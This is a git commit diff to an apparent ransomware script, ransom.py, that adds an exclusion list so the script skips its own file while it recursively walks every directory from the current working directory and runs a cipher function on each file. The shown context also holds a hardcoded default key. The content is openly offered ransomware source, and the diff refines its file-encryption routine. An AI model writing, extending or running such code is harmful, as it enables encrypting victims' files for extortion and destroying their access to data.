01dbb9d290202939a4c0ca99d4802fcfd100f578
Nekro <70316327+NeKroFR@users.noreply.github.com>
2024-01-12 15:51:45 +0100

    Update ransom.py

--- scripts/ransom.py
+++ scripts/ransom.py
@@ -13,6 +13,8 @@ def cipher(file,key):
 def ransom(way):
     directory=os.listdir(way)
     for dir in directory:
+        if dir in exclu:
+            continue
         if os.path.isdir(f"{way}/{dir}"):
             ransom(f"{way}/{dir}/")
         else:
@@ -20,6 +22,7 @@ def ransom(way):
 
 os.system('clear')
 path= os.getcwd()
+exclu=["ransom.py"]
 key = input("Enter a key: ")
 if key =="":
     key="JNUW4ZZAMRUWG2ZAO5QXGIDIMVZGK==="
